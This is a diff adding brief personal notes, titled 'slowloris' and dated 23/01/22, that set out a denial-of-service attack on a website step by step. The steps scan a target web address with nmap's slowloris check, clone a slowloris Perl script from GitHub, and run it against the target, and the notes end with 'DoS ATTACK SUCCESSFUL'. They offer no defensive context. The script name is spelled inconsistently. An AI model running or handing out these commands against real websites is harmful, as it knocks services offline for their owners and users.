@@ -1,1 +1,11 @@
 23/01/22
+slowloris
+1) Run commands in terminal
+> nmap -T4 --script http-slowloris-check <TARGET WEB ADDRESS> git clone https://github.com/llaera/slowloris.pl.git 
+------ GO TO FILES AND OPEN sloworis.pl---------
+Run commands:
+> perl sloworis.pl -dns <TARGET WEB ADDRESS>
+----CHECK THE TARGET WEBSITE-------
+-----DoS ATTACK SUCCESSFUL------
+----end-----
+ 
